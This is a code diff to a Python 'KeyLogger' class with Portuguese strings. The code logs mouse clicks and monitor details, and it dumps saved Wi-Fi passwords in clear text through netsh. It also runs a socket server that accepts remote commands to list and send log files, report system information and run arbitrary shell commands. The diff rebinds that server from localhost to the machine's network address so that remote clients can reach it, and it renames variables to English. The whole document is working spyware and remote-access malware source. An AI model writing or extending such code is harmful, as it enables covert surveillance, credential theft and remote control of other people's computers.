@@ -21,7 +21,7 @@ class KeyLogger():
 
     @staticmethod
     def get_monitors(self):
-        with open(self.filename, 'a') as logs:
+        with open(self.filename.replace('.txt','-c.txt'), 'a') as logs:
             for monitores in get_monitors():
                 logs.write(str(monitores))
 
@@ -29,35 +29,35 @@ class KeyLogger():
         meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profile']) 
         data = meta_data.decode('utf-8', errors ="backslashreplace")
         data = data.split('\n') 
-        perfis = []
+        profiles = []
         with open(self.filename, 'a') as logs:
             for i in data:
                 if "All User Profile" in i :
                     i = i.split(":")
                     i = i[1]
                     i = i[1:-1]
-                    perfis.append(i)
+                    profiles.append(i)
                 if "Todos os Perfis" in i :
                     i = i.split(":")
                     i = i[1]
                     i = i[1:-1]
-                    perfis.append(i)
-            logs.write("\n{:<30}| {:<}".format("Nome do Wi-Fi (SSID)", "Senha"))
+                    profiles.append(i)
+            logs.write("\n{:<30}| {:<}".format("Nome do Wi-Fi (SSID)", "senhas"))
             logs.write("\n----------------------------------------------")
-            for perfil in perfis:
+            for profile in profiles:
                 try:
-                    registros = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', perfil, 'key=clear'])
-                    registros = registros.decode('utf-8', errors ="backslashreplace")
-                    registros = registros.split('\n')
-                    senha = [b.split(":")[1][1:-1] for b in registros if "Key Content" in b]
-                    if senha == []:
-                        senha = [b.split(":")[1][1:-1] for b in registros if "da Chave" in b]
+                    regs = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'])
+                    regs = regs.decode('utf-8', errors ="backslashreplace")
+                    regs = regs.split('\n')
+                    passwords = [b.split(":")[1][1:-1] for b in regs if "Key Content" in b]
+                    if passwords == []:
+                        passwords = [b.split(":")[1][1:-1] for b in regs if "da Chave" in b]
                     try:
-                        logs.write("\n{:<30}| {:<}".format(perfil, senha[0]))
+                        logs.write("\n{:<30}| {:<}".format(profile, passwords[0]))
                     except IndexError:
-                        logs.write("\n{:<30}| {:<}".format(perfil, ""))
+                        logs.write("\n{:<30}| {:<}".format(profile, ""))
                 except subprocess.CalledProcessError:
-                    print('Erro')
+                    print('Error')
             logs.write("\n----------------------------------------------\n")
         return
 
@@ -104,7 +104,7 @@ class KeyLogger():
 
     def on_click(self, x, y, button, pressed):
         if pressed:
-            with open(self.filename, 'a') as logs:
+            with open(self.filename.replace('.txt','-c.txt'), 'a') as logs:
                 logs.write('\nClick registrado em ({0}, {1}) usando {2}\n'.format(x, y, button))
             
     def get_win_name(self):
@@ -126,13 +126,16 @@ class KeyLogger():
         escuta1.start()
         escuta2.start()
         self.get_monitors(self)
-        self.get_WiFi()
+        if not os.path.exists(self.filename):
+            self.get_WiFi()
 
 if __name__ == '__main__':
     logger = KeyLogger()
     logger.main()
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host = 'localhost'
+    hostname = socket.gethostname()
+    IPAddr = socket.gethostbyname(hostname)
+    host = IPAddr
     port = 42424
     folder = os.getenv('APPDATA')+'/Logs/'
     server.bind((host, port))
@@ -147,7 +150,12 @@ if __name__ == '__main__':
         if command == '.list':
             try:
                 reply = os.listdir(folder)
-                client.send(str(reply).encode())
+                for l in reply:
+                    bytes_read = l.encode()
+                    time.sleep(0.025)
+                    if not bytes_read:
+                            break
+                    client.sendall(bytes_read)
             except:
                 client.send('Pasta não encontrada'.encode())
         if command == '.info':
@@ -156,7 +164,12 @@ if __name__ == '__main__':
             reply.append(platform.processor())
             reply.append(platform.system())
             reply.append(platform.release())
-            client.send(str(reply).encode())
+            for l in reply:
+                bytes_read = l.encode()
+                time.sleep(0.025)
+                if not bytes_read:
+                        break
+                client.sendall(bytes_read)
         if command.startswith('.cmd'):
             reply = command.replace('.cmd ','').split()
             reply = subprocess.Popen(reply, stdout=subprocess.PIPE)
@@ -164,8 +177,11 @@ if __name__ == '__main__':
             reply = reply.decode("unicode_escape")
             reply = reply.split('\n')
             for l in reply:
+                bytes_read = l.encode()
                 time.sleep(0.025)
-                client.send(l.encode())
+                if not bytes_read:
+                        break
+                client.sendall(bytes_read)
         elif command.endswith('.txt'):
             with open(os.path.join(folder,command), "rb") as file:
                 while True:
